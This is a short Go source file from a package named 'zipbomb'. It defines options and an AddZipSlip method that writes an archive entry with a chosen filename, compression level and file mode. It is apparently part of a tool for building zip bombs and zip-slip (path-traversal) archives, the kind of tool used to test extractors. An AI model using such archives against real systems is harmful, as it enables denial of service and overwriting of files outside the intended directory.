package zipbomb

import "io/fs"

type ZipSlipOptions struct {
	Method           uint16
	CompressionLevel int // Deflate [-2,9]
	FileMode         fs.FileMode
}

func (zb *ZipBomb) AddZipSlip(kernelBytes []byte, filename string, optFns ...func(o *ZipSlipOptions)) error {
	opts := ZipSlipOptions{
		CompressionLevel: 5,
		Method:           Deflate,
	}

	for _, fn := range optFns {
		fn(&opts)
	}

	k, err := newKernel(filename, kernelBytes, opts.Method, opts.CompressionLevel)
	if err != nil {
		return err
	}

	if opts.FileMode != 0 {
		lfh := k.LocalFileHeader()
		lfh.SetMode(opts.FileMode)
	}

	files := []fileRecord{
		{
			header: k.LocalFileHeader(),
			data:   k.CompressedBytes(),
		},
	}

	zb.uncompressedSize = zb.uncompressedSize + int64(k.UncompressedSize())

	return zb.writeFiles(files)
}
